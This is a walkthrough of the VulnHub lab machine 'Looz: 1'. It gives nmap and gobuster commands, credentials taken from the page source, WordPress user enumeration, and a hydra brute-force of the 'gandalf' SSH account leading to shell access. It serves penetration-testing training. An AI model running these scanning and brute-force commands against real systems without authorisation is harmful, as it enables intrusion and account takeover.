# Looz: 1

- **Machine:** Looz: 1
- **Download:** https://www.vulnhub.com/entry/looz-1,732/

![](767-1.png)

---

# Setup

1. Extract the downloaded archive.
2. Import the `.ova` file into VirtualBox.
3. Click **Finish**.
4. Start the virtual machine.

---

# Network Scanning

## Discover the Target IP

```bash
nmap -sn 192.168.2.0/24
```

![](767-2.png)

---

## Full Nmap Scan

Run a complete Nmap scan to identify open ports, services, operating system details, and default NSE scripts.

```bash
nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.102
```

![](767-3.png)

---

## Optional Port Scan

```bash
nmap -v -p- 192.168.2.102
```

```bash
nmap -sC -sV -A 192.168.2.102
```

---

## HTTP Enumeration

Run the `http-enum` NSE script to identify hidden web resources.

```bash
nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.2.102
```

---

# Web Enumeration

Visit the web application.

- http://192.168.2.102

---

## Directory Enumeration

Perform directory brute-forcing on **port 8081**.

```bash
gobuster dir -u http://192.168.2.102:8081 -w /usr/share/wordlists/dirb/common.txt
```

![](767-4.png)

One of the discovered endpoints is:

- http://192.168.2.102:8081/wp-admin/

The page redirects because the required hostname is not configured.

---

## Configure the Hostname

Add the hostname entry.

```bash
nano /etc/hosts
```

Add the following line:

```text
192.168.2.102 wp.looz.com
```

![](767-5.png)

Refresh the page.

![](767-6.png)

---

## Discover Credentials

Visit the web application on **port 80** and inspect the page source.

![](767-7.png)

Hidden credentials are found.

```text
Username : john
Password : y0uC@n'tbr3akIT
```

Login using the discovered credentials.

![](767-8.png)

Successfully authenticated.

- http://wp.looz.com/wp-admin/

![](767-9.png)

---

## User Enumeration

Navigate to the **Users** section.

Another user with **Administrator** privileges is discovered.

![](767-10.png)

---

# SSH Access

Attempt to brute-force the SSH password for the administrator account.

```bash
hydra -l gandalf -P /opt/rockyou.txt ssh://192.168.2.102 -t 16
```

![](767-11.png)

> **Note:** The brute-force process took approximately one hour to complete.

After recovering the password, establish an SSH session.

```bash
ssh gandalf@192.168.2.102
```

![](767-12.png)

![](767-13.png)

SSH access is successfully obtained.

---

# Key Learning

- Enumerate both standard and non-standard HTTP ports.
- Configure virtual hostnames in `/etc/hosts` whenever required.
- Always inspect the HTML source code for hidden comments or credentials.
- WordPress user enumeration may reveal additional privileged accounts.
- Weak SSH passwords remain a common attack vector.
- Hydra can be used to validate weak credentials for exposed SSH services.

---

# Summary

The assessment began with web enumeration, where a WordPress installation hosted on a virtual hostname was identified. After configuring the hostname locally, inspecting the application's source code revealed valid WordPress credentials. Access to the WordPress dashboard exposed another administrator account named **gandalf**. A password brute-force attack against the SSH service successfully recovered valid credentials, resulting in authenticated SSH access to the target machine.